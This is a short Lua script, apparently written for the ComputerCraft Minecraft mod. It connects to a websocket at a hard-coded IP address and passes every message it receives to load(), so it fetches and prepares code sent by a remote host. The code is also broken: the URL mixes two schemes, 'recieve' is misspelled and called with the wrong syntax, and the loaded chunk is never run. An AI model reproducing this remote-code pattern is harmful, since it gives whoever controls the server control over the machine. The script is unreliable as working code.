local ws = assert(http.websocket("wss://http://51.250.0.4:9000"))
if ws then
    term.write("Connected! to wss://http://51.250.0.4:9000")
    while ws do
        data = ws.recieve()
        if data ~= nil then
            term.write("data recieved")
            load(data)
            term.write("processed")
        end
    end
end